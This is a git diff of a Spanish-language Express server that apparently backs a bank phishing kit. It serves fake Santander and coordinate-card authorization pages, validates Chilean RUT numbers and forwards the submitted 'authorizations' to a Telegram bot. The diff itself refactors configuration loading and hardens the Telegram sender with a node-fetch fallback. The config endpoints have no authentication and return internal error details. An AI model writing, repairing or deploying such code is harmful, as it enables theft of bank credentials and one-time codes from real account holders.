@@ -9,18 +9,33 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
 
-// Path absoluto al archivo de configuración (evita problemas de working dir)
-const cfgPath = path.join(__dirname, 'config.json');
+// Paths para configuración
+const rootCfgPath = path.join(__dirname, 'config.json');
+const dataCfgPath = path.join(__dirname, 'data', 'config.json');
+const tmpCfgPath = path.join('/tmp', 'config.json');
 
-// Helper seguro para enviar mensajes a Telegram sin romper la ejecución
+// Helper seguro para enviar mensajes a Telegram con fallback a node-fetch si hace falta
 async function safeSendTelegram(text) {
   if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) {
     console.warn('Telegram no configurado: TELEGRAM_TOKEN o CHAT_ID faltante');
-    return;
+    return false;
+  }
+
+  // Determine fetch implementation
+  let fetchFn = global.fetch;
+  if (!fetchFn) {
+    try {
+      // Dynamic import for node-fetch (works with Node >= 12+ if installed)
+      const nodeFetch = await import('node-fetch');
+      fetchFn = nodeFetch.default || nodeFetch;
+    } catch (e) {
+      console.error('No hay fetch global y no se pudo importar node-fetch:', e && e.message ? e.message : e);
+      return false;
+    }
   }
 
   try {
-    const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+    const response = await fetchFn(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text })
@@ -30,9 +45,13 @@ async function safeSendTelegram(text) {
       let bodyText = '';
       try { bodyText = await response.text(); } catch (_) {}
       console.error('Telegram respondió con error:', response.status, bodyText);
+      return false;
     }
+
+    return true;
   } catch (err) {
     console.error('Error enviando a Telegram:', err);
+    return false;
   }
 }
 
@@ -56,15 +75,37 @@ function validarRut(rutCompleto) {
   return dv === dvEsperado;
 }
 
+// Leer configuración probando varias rutas y saltando archivos corruptos
+function readConfig() {
+  const tried = [];
+  const paths = [dataCfgPath, rootCfgPath, tmpCfgPath];
+  let lastErr = null;
+  for (const p of paths) {
+    tried.push(p);
+    try {
+      if (fs.existsSync(p)) {
+        const raw = fs.readFileSync(p, 'utf8');
+        const cfg = JSON.parse(raw);
+        return { cfg, path: p };
+      }
+    } catch (err) {
+      // Log and continue to next path
+      console.warn(`Error leyendo/parsing ${p}:`, err && err.message ? err.message : err);
+      lastErr = err;
+      continue;
+    }
+  }
+  return { error: lastErr || new Error('No config file found'), tried };
+}
+
 // Endpoint para leer configuración
 app.get("/config", (req, res) => {
-  try {
-    const cfg = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
-    res.json(cfg);
-  } catch (err) {
-    console.error('Error leyendo config.json desde', cfgPath, err);
-    res.status(500).json({ error: 'Error leyendo configuración' });
+  const result = readConfig();
+  if (result.cfg) {
+    return res.json(result.cfg);
   }
+  console.error('Error leyendo config.json, intentados:', result.tried, result.error);
+  return res.status(500).json({ error: 'Error leyendo configuración', details: String(result.error), tried: result.tried });
 });
 
 // Endpoint para procesar saldo directamente (flujo original)
@@ -80,30 +121,24 @@ app.post("/procesarSaldo", async (req, res) => {
 
 // Endpoint para guardar configuración
 app.post("/config", (req, res) => {
-  const dataDir = path.join(__dirname, "data");
-  const configPath = path.join(dataDir, "config.json");
-
   try {
+    // Ensure data dir exists
+    const dataDir = path.dirname(dataCfgPath);
     if (!fs.existsSync(dataDir)) {
       fs.mkdirSync(dataDir, { recursive: true });
     }
-    fs.writeFileSync(configPath, JSON.stringify(req.body, null, 2));
-    console.log('Configuración guardada en', configPath);
+    fs.writeFileSync(dataCfgPath, JSON.stringify(req.body, null, 2));
+    console.log('Configuración guardada en', dataCfgPath);
     return res.json(req.body);
   } catch (err) {
-    console.error('Error guardando config.json en', configPath, err);
+    console.error('Error guardando config.json en', dataCfgPath, err);
     try {
-      const fallbackPath = path.join('/tmp', 'config.json');
-      fs.writeFileSync(fallbackPath, JSON.stringify(req.body, null, 2));
-      console.warn('Guardado fallback en', fallbackPath);
+      fs.writeFileSync(tmpCfgPath, JSON.stringify(req.body, null, 2));
+      console.warn('Guardado fallback en', tmpCfgPath);
       return res.json(req.body);
     } catch (fallbackErr) {
       console.error('Fallback a /tmp falló:', fallbackErr);
-      return res.status(500).json({
-        error: 'Error guardando configuración',
-        details: err.message || String(err),
-        fallback: fallbackErr.message || String(fallbackErr)
-      });
+      return res.status(500).json({ error: 'Error guardando configuración', details: String(err), fallback: String(fallbackErr) });
     }
   }
 });
@@ -115,17 +150,20 @@ app.get("/admin", (req, res) => {
 
 // Decidir qué página de autorización mostrar
 app.get("/autorizacion", (req, res) => {
-  try {
-    const cfg = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
-    if (cfg.tipoAutorizacion === "santander") {
-      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
-      return;
+  const result = readConfig();
+  if (result.cfg) {
+    try {
+      if (result.cfg.tipoAutorizacion === "santander") {
+        return res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
+      }
+      return res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
+    } catch (err) {
+      console.error('Error sirviendo autorización:', err);
+      return res.status(500).send('Error interno');
     }
-    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
-  } catch (err) {
-    console.error('Error leyendo config.json en /autorizacion:', err);
-    res.status(500).send('Error interno');
   }
+  console.error('Error leyendo config.json en /autorizacion:', result.tried, result.error);
+  return res.status(500).send('Error interno');
 });
 
 // Endpoint para recibir autorizaciones y reenviar a Telegram
